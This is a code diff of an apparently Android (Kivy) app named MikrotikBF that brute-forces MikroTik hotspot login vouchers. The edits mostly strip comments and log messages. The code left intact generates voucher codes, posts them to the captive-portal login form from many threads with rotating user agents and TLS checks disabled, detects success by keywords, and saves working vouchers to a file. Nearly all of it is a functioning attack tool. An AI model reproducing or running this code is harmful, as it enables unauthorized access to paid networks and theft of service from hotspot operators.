@@ -1,9 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""
-MikrotikBF v2.0 — Android Edition
-Uses requests + threading (Android-compatible)
-"""
+"""MikrotikBF v2.0 — Android Edition"""
 
 import os
 import sys
@@ -28,9 +25,6 @@ from kivy.utils import platform
 import requests
 from bs4 import BeautifulSoup
 
-# ═══════════════════════════════════════════════════════════
-#  الإعدادات
-# ═══════════════════════════════════════════════════════════
 DEFAULT_TARGET = "http://t.net/index.html"
 DEFAULT_PREFIX = "31"
 DEFAULT_SUFFIX = "2"
@@ -48,7 +42,6 @@ BATCH_REST = 10
 USER_AGENTS = [
     "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
 ]
 
 SUCCESS_KEYWORDS = ["status", "success", "welcome", "logged in", "valid", "you are logged in"]
@@ -147,7 +140,6 @@ class HusseinNetTool:
         self.session.headers.update({
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.5",
-            "Connection": "keep-alive",
         })
 
     def close_session(self):
@@ -158,22 +150,12 @@ class HusseinNetTool:
                 pass
         self.db.close()
 
-    def get_random_headers(self):
-        return {"User-Agent": random.choice(USER_AGENTS)}
-
     def fetch_with_retry(self, method, url, **kwargs):
         for attempt in range(RETRY_ATTEMPTS):
             try:
-                headers = self.get_random_headers()
-                if 'headers' in kwargs:
-                    headers.update(kwargs.pop('headers'))
-                r = self.session.request(
-                    method, url,
-                    headers=headers,
-                    timeout=REQUEST_TIMEOUT,
-                    verify=False,
-                    **kwargs
-                )
+                headers = {"User-Agent": random.choice(USER_AGENTS)}
+                r = self.session.request(method, url, headers=headers,
+                                         timeout=REQUEST_TIMEOUT, verify=False, **kwargs)
                 if r.status_code >= 400:
                     raise Exception(f"HTTP {r.status_code}")
                 return r, r.text
@@ -203,7 +185,6 @@ class HusseinNetTool:
 
             if login_links:
                 login_url = login_links[0]
-                self.log(f"[*] رابط login: {login_url}\n")
                 try:
                     resp2, html2 = self.fetch_with_retry('GET', login_url)
                     soup2 = BeautifulSoup(html2, 'html.parser')
@@ -219,8 +200,6 @@ class HusseinNetTool:
                         return True
                 except Exception as e:
                     self.log(f"[-] فشل: {e}\n")
-            else:
-                self.log("[-] لا يوجد رابط login\n")
             return False
 
         action = form.get('action', '')
@@ -256,7 +235,6 @@ class HusseinNetTool:
         while attempts < self.max_attempts and not self.stop_event.is_set():
             voucher = self.generate_voucher()
             if voucher is None:
-                self.log("[!] استنفاد الكروت\n")
                 break
             try:
                 self.queue.put(voucher, timeout=1)
@@ -280,10 +258,6 @@ class HusseinNetTool:
             except queue.Empty:
                 continue
             if voucher is None:
-                try:
-                    self.queue.task_done()
-                except Exception:
-                    pass
                 break
 
             self.current_voucher = voucher
@@ -314,9 +288,7 @@ class HusseinNetTool:
                     data[key] = '1234'
 
             try:
-                resp, body = self.fetch_with_retry(
-                    'POST', self.login_url, data=data, allow_redirects=True
-                )
+                resp, body = self.fetch_with_retry('POST', self.login_url, data=data, allow_redirects=True)
                 final_url = str(resp.url).lower()
                 body_lower = body.lower()
 
@@ -344,11 +316,6 @@ class HusseinNetTool:
                 if self.total_attempts % 50 == 0:
                     self.log(f"[خطأ] {voucher} - {str(e)[:30]}\n")
 
-            try:
-                self.queue.task_done()
-            except Exception:
-                pass
-
     def save_valid_voucher(self, voucher, final_url):
         try:
             with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
@@ -360,10 +327,7 @@ class HusseinNetTool:
         while not self.stop_event.is_set():
             elapsed = time.time() - self.start_time if self.start_time else 0
             rate = self.total_attempts / elapsed if elapsed > 0 else 0
-            status = (f"⚡ {rate:.1f} req/s | "
-                      f"🎯 {self.total_attempts}/{self.max_attempts} | "
-                      f"❌ {self.error_count} | "
-                      f"🎫 {self.current_voucher or '---'}")
+            status = f"⚡ {rate:.1f} | 🎯 {self.total_attempts}/{self.max_attempts} | ❌ {self.error_count} | 🎫 {self.current_voucher or '---'}"
             self.log(f"\r{status}")
             time.sleep(1.0)
 
@@ -384,8 +348,7 @@ class HusseinNetTool:
 
         producer_thread = threading.Thread(target=self.producer, daemon=True)
         ui_thread = threading.Thread(target=self.ui_reporter, daemon=True)
-        self.workers = [threading.Thread(target=self.worker, args=(i,), daemon=True)
-                        for i in range(MAX_THREADS)]
+        self.workers = [threading.Thread(target=self.worker, args=(i,), daemon=True) for i in range(MAX_THREADS)]
 
         producer_thread.start()
         ui_thread.start()
@@ -396,7 +359,7 @@ class HusseinNetTool:
             while not self.stop_event.is_set():
                 time.sleep(0.5)
         except KeyboardInterrupt:
-            self.log("\nتم الإيقاف يدوياً\n")
+            pass
         finally:
             self.shutdown()
             self.close_session()
@@ -439,25 +402,13 @@ class MikrotikBFApp(App):
         self.attempts_inp = make_input('المحاولات', str(DEFAULT_MAX_ATTEMPTS))
 
         btn_box = BoxLayout(orientation='horizontal', size_hint_y=None, height=50, spacing=8)
-        self.start_btn = Button(
-            text='▶ ابدأ',
-            background_color=(0.66, 0.33, 0.97, 1),
-            font_size='16sp'
-        )
+        self.start_btn = Button(text='▶ ابدأ', background_color=(0.66, 0.33, 0.97, 1), font_size='16sp')
         self.start_btn.bind(on_press=self.start_attack)
-        self.stop_btn = Button(
-            text='⏹ إيقاف',
-            background_color=(0.94, 0.27, 0.27, 1),
-            font_size='16sp', disabled=True
-        )
+        self.stop_btn = Button(text='⏹ إيقاف', background_color=(0.94, 0.27, 0.27, 1), font_size='16sp', disabled=True)
         self.stop_btn.bind(on_press=self.stop_attack)
         btn_box.add_widget(self.start_btn)
         btn_box.add_widget(self.stop_btn)
         root.add_widget(btn_box)
-
-        log_label = Label(text='السجل:', size_hint_y=None, height=24,
-                          color=(0.78, 0.84, 0.9, 1))
-        root.add_widget(log_label)
 
         scroll = ScrollView()
         self.log_input = TextInput(
@@ -470,7 +421,6 @@ class MikrotikBFApp(App):
         root.add_widget(scroll)
 
         sys.stdout = LogWriter(self.append_log)
-
         return root
 
     def append_log(self, text):
